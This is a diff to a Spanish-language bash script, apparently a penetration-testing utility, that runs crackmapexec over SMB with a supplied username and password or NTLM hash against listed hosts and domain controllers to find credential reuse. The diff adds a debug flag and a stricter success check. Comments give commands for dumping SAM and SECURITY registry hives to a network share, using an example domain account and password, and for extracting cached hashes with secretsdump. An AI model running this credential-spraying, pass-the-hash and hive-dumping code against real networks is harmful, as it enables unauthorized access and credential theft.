@@ -9,16 +9,16 @@ RESET='\e[0m'
 
 #iptables -I INPUT -p icmp --icmp-type 8 -j DROP
 
-while getopts ":u:h:p:f:" OPTIONS
-do
-            case $OPTIONS in            
-            u)     USUARIO=$OPTARG;;
-            h)     HASH=$OPTARG;;
-            p)     PASSWORD=$OPTARG;;
-			f)     FILE=$OPTARG;;
-            ?)     printf "Opcion invalida: -$OPTARG\n" $0
-                          exit 2;;
-           esac
+while getopts ":u:h:p:f:d" OPTIONS; do
+    case $OPTIONS in            
+        u) USUARIO=$OPTARG;;
+        h) HASH=$OPTARG;;
+        p) PASSWORD=$OPTARG;;
+        f) FILE=$OPTARG;;
+        d) DEBUG=true;;
+        ?) printf "Opcion invalida: -$OPTARG\n" $0
+           exit 2;;
+    esac
 done
 
 USUARIO=${USUARIO:=NULL}
@@ -54,7 +54,7 @@ MIN_RAM=900;
 MAX_SCRIPT_INSTANCES=15
 if [ $USUARIO = NULL ] ; then
 echo "|              														 			"
-echo "| USO: local-admin-checker.sh -u [usuario] -h [hash] -p [password] -f [file] (opcional)"
+echo "| USO: local-admin-checker.sh -u [usuario] -h [hash] -p [password] -f [file] -d (opcional)"
 echo "|																		 			"
 echo ""
 exit
@@ -69,7 +69,10 @@ fi
 #   reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SECURITY' -o '\\192.168.56.132\share'
 #3) secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL
 #   secretsdump -security SECURITY.save -system SYSTEM.save LOCAL # DCC2 (Domain Cached credentials 2 ) hashcat mode 2100
-echo -e "$OKBLUE  USUARIO:$USUARIO HASH:$HASH PASSWORD:$PASSWORD FILE $FILE $RESET"
+echo "DEBUG $DEBUG"
+if [ "$DEBUG" == "true" ]; then
+    echo -e "${OKBLUE}USUARIO: $USUARIO HASH: $HASH PASSWORD: $PASSWORD FILE: $FILE${RESET}"
+fi
 
 function checkRAM (){
 	while true; do
@@ -91,13 +94,18 @@ function checkRAM (){
 for ip in $(cat $FILE); do
 	echo -e "[+] $OKBLUE Testeando $ip .. $RESET"
 	if [ "$PASSWORD" != NULL ] ; then
-	#echo "PASSWORD $PASSWORD"				
-		echo "Usando password $PASSWORD"
+	#echo "PASSWORD $PASSWORD"	
+		if [ "$DEBUG" == "true" ]; then
+			echo "Usando password $PASSWORD"
+		fi			
+			
 		crackmapexec smb $ip -u $USUARIO -p $PASSWORD --local-auth  | tee -a logs/cracking/"$ip"_smb_reusoPassword.txt & #local
 		sleep 0.3
 	else
-		echo "Usando HASH $HASH"
-		echo "crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth "
+		if [ "$DEBUG" == "true" ]; then
+			echo "Usando HASH $HASH"
+			echo "crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth "
+		fi	
 		crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth  | tee -a logs/cracking/"$ip"_smb_reusoPassword.txt & #local				
 	fi	
 done
@@ -117,7 +125,7 @@ done	# done true
 for ip in $(cat $FILE); do
 			
 		################ user hacked ########
-		grep -qai '+' logs/cracking/"$ip"_smb_reusoPassword.txt 2>/dev/null
+		grep -a '+' logs/cracking/"$ip"_smb_reusoPassword.txt | egrep -qiv 'STATUS_LOGON_FAILURE' 2>/dev/null
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then						
 			echo -e "\t$OKRED[i] Reuso de password en ($ip) $RESET"
@@ -137,16 +145,22 @@ DOMAIN_CONTROLERS=`ls logs/enumeracion/ | grep kerbrute_users.txt | cut -d '_' -
 
 for ip in $DOMAIN_CONTROLERS; do
 	echo -e "[+] $OKBLUE Testeando controlador de dominio $ip .. $RESET"
-	if [ "$PASSWORD" != NULL ] ; then			
-		echo "Usando password $PASSWORD"
+	if [ "$PASSWORD" != NULL ] ; then	
+		if [ "$DEBUG" == "true" ]; then
+			echo "Usando password $PASSWORD"
+		fi			
+		
 		crackmapexec smb $ip -u $USUARIO -p $PASSWORD  | tee -a logs/cracking/"$ip"_smb_reusoPassword2.txt #domain
 	else
-		echo "Usando HASH $HASH"
-		echo "crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth "
+		if [ "$DEBUG" == "true" ]; then
+			echo "Usando HASH $HASH"
+			echo "crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth "
+		fi	
+		
 		crackmapexec smb $ip -u $USUARIO -H $HASH | tee -a logs/cracking/"$ip"_smb_reusoPassword2.txt #domain
 	fi
 
-	grep -qai '+' logs/cracking/"$ip"_smb_reusoPassword2.txt 2>/dev/null
+	grep -a '+' logs/cracking/"$ip"_smb_reusoPassword2.txt | egrep -qiv 'STATUS_LOGON_FAILURE' 2>/dev/null
 	greprc=$?
 	if [[ $greprc -eq 0 ]] ; then						
 		echo -e "\t$OKRED[i] Reuso de password en ($ip) $RESET"
